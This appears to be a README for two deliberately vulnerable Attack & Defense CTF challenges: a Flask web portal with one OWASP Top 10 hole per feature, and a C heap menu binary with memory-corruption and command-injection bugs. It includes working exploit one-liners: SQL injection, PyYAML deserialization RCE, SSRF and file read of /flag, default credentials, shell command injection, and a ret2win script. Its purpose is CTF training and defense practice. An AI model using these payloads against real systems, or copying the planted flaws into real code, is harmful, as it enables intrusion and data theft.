# TCP1P A&D Testing

Two **Attack & Defense** challenges for GZCTF, built to exercise the A&D engine
(per-tick flag rotation, SLA checking, in-place patch/restart). Each challenge
ships as a **service image** (the team's box) and a separate **checker image**
that the platform spawns every tick.

| Challenge | Service dir | Checker dir | Port | Stack |
|-----------|-------------|-------------|------|-------|
| **owasp-portal** — OWASP Top 10 web app | `owasp-portal/` | `owasp-portal-checker/` | 8080 | Python/Flask + SQLite |
| **pwn-armory** — many memory-corruption bugs | `pwn-armory/` | `pwn-armory-checker/` | 9000 | C (TCP, served by socat) |

## Platform contract (how these plug into GZCTF A&D)

**Service image**
- `LABEL org.gzctf.keep="true"` so the host's `docker image prune -af` cron
  (which excludes that label) never deletes it.
- **supervisord runs as PID 1**; the actual service is a child `[program:svc]`.
  An in-place *restart (retain data)* just bounces the child, so the container
  never exits and the defending team's filesystem patches survive.
- **No baked flag.** The platform writes the live, per-tick flag to
  `$GZCTF_FLAG_FILE` (Docker: `/flag` read-only bind mount; K8s:
  `/gzctf-flag/flag` via the flag-pull sidecar). The service reads it **fresh**
  on every disclosure — a missing file just means warmup.

**Checker image** — `ENTRYPOINT` runs once per tick. enochecker3 exit codes:

| exit | meaning |
|------|---------|
| `0` | **Ok** — service is functionally healthy |
| `1` | **Mumble** — answered but behaved incorrectly |
| `2` | **Offline** — TCP refused / timeout / unreachable |
| `3` | **InternalError** — checker bug / missing env |

The executor injects `GZCTF_TARGET_IP`, `GZCTF_TARGET_PORT`, `GZCTF_ROUND`,
`GZCTF_TEAM_ID`, and `GZCTF_FLAG`. **Both checkers verify functionality only**
(per requirement): they exercise the legitimate features for SLA and never
touch a planted vulnerability. Flag *theft* is the attackers' job (steal the
victim team's planted flag and submit it) — that path is independent of the SLA
checker.

---

## Challenge 1 — `owasp-portal` (OWASP Top 10, every vuln leaks the flag)

A "team portal": register, log in, write/search private notes, reset password,
import settings/prefs, fetch link previews. Each legitimate feature also carries
exactly one OWASP-Top-10 (2021) vulnerability, and **every one yields the flag.**
Defenders must patch all ten while keeping the checker green.

The live flag is mirrored into the data layer every request (admin note #1 +
`config.flag`) so each class has a realistic path to it.

| # | OWASP 2021 | Where | How it leaks the flag |
|---|------------|-------|-----------------------|
| A01 | Broken Access Control | `GET /api/notes/<id>` | IDOR — no ownership check; read admin note #1 |
| A02 | Cryptographic Failures | `session` cookie | weak `md5(secret="secret")` sig → forge `role=admin` → `/admin` |
| A03 | Injection | `GET /api/search?q=` | string-concat SQL → `' ) UNION SELECT 1,k,v FROM config-- -` |
| A04 | Insecure Design | `POST /reset` | reset token returned in the response → take over `admin` → `/admin` |
| A05 | Security Misconfiguration | `GET /debug?file=` | `APP_DEBUG=1` → arbitrary file read → `?file=/flag` |
| A06 | Vulnerable/Outdated Components | `POST /import/yaml` | PyYAML 3.13 `yaml.load` → `!!python/object/apply:subprocess.check_output` |
| A07 | Auth Failures | `POST /login` | default creds `admin:admin123`, no rate limit |
| A08 | Software & Data Integrity | `POST /import/prefs` | `pickle.loads` of user blob → `__reduce__` RCE |
| A09 | Logging & Monitoring Failures | `GET /logs/app.log` | flag logged in cleartext to a web-served logfile |
| A10 | SSRF | `GET /fetch?url=` | no scheme/host filter → `file:///flag` |

### Worked exploit one-liners (verified)
```sh
B=http://TARGET:8080
# A07 default creds → admin dashboard (flag in JSON)
ACK=$(curl -si -XPOST $B/login -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin123"}' | sed -n 's/^[Ss]et-[Cc]ookie: //p' | cut -d';' -f1)
curl -s $B/admin -H "Cookie: $ACK"
# A05 arbitrary file read
curl -s "$B/debug" --data-urlencode 'file=/flag' -G
# A06 PyYAML RCE
curl -s -XPOST $B/import/yaml --data-binary '!!python/object/apply:subprocess.check_output [["cat","/flag"]]'
# A10 SSRF
curl -s "$B/fetch" --data-urlencode 'url=file:///flag' -G
# A03 SQLi (needs any logged-in session cookie $UCK)
curl -s "$B/api/search" --data-urlencode "q=' ) UNION SELECT 1,k,v FROM config-- -" -G -H "Cookie: $UCK"
```

### Checker (functionality only)
`/health`, register, login, note create + readback, list, search, password-reset
round-trip, benign YAML import, prefs export→import round-trip, and a benign
`fetch`. All pass → **Ok**; wrong behaviour → **Mumble**; unreachable → **Offline**.

---

## Challenge 2 — `pwn-armory` (many PWN bugs)

A menu-driven heap "item manager" over TCP (one process per connection via
`socat`). Compiled deliberately weak — **no canary, no PIE, no RELRO, exec
stack** — so the bugs are exploitable. `print_flag()` reads `$GZCTF_FLAG_FILE`
and is the canonical win target.

| # | Bug | Menu option | Notes |
|---|-----|-------------|-------|
| 1 | Stack buffer overflow | `0` Set nick | 32-byte buf, `read()` 256 → ret2win `print_flag` (offset 40) |
| 2 | Format string | `6` Echo | `printf(user_buf)` → leak + `%n` write `admin` |
| 3 | Use-after-free | `4` Delete then `2/3` | delete never NULLs the slot |
| 4 | Double free | `4` Delete ×2 | same slot freed twice |
| 5 | OOB array index | `1/2/3/4` | `idx` never bound-checked (incl. negative) |
| 6 | Signed size → malloc | `1` Add | negative size → huge `size_t` |
| 7 | Heap overflow | `3` Edit | writes a caller-supplied length, no bound |
| 8 | Command injection | `7` Ping | `system("ping -c1 " + host)` |
| 9 | Backdoor win | `print_flag()` | reachable via #1/#2/#5/#7 |
| 10 | Uninitialized heap leak | `1` then `2` | `malloc` not zeroed + optional write |

### Worked exploits (verified)
```sh
# #8 command injection — instant flag
printf '7\n; cat /flag #\n9\n' | nc TARGET 9000
# #1 ret2win (print_flag@0x401226, +1 for 16-byte alignment)
python3 -c 'import socket,struct;s=socket.create_connection(("TARGET",9000));s.recv(200);s.sendall(b"0\n");s.recv(200);s.sendall(b"A"*40+struct.pack("<Q",0x401227)+b"\n");import time;time.sleep(0.5);print(s.recv(4096))'
```

### Checker (functionality only)
Drives Add → Show → List → Edit → Show → Echo → Secret(locked) → Delete legitimately
and asserts the intended outputs in order. It only checks behaviours that hold
on both the shipped and a patched binary (e.g. it does **not** assume the list
is empty right after a delete).

---

## Build & local test

```sh
# build
docker build -t tcp1p/owasp-portal:test       ./owasp-portal
docker build -t tcp1p/owasp-portal-checker:test ./owasp-portal-checker
docker build -t tcp1p/pwn-armory:test          ./pwn-armory
docker build -t tcp1p/pwn-armory-checker:test  ./pwn-armory-checker

# run a service with a fake flag, then point the checker at its container IP
echo 'flag{local_test}' > /tmp/flag
docker run -d --name svc -v /tmp/flag:/flag:ro tcp1p/owasp-portal:test
IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' svc)
docker run --rm --network host \
  -e GZCTF_TARGET_IP=$IP -e GZCTF_TARGET_PORT=8080 -e GZCTF_ROUND=1 -e GZCTF_TEAM_ID=1 \
  tcp1p/owasp-portal-checker:test; echo "exit=$?"   # 0 = Ok
```

> These are intentionally vulnerable. Run them only inside the isolated A&D
> environment — never expose them on a trusted network.
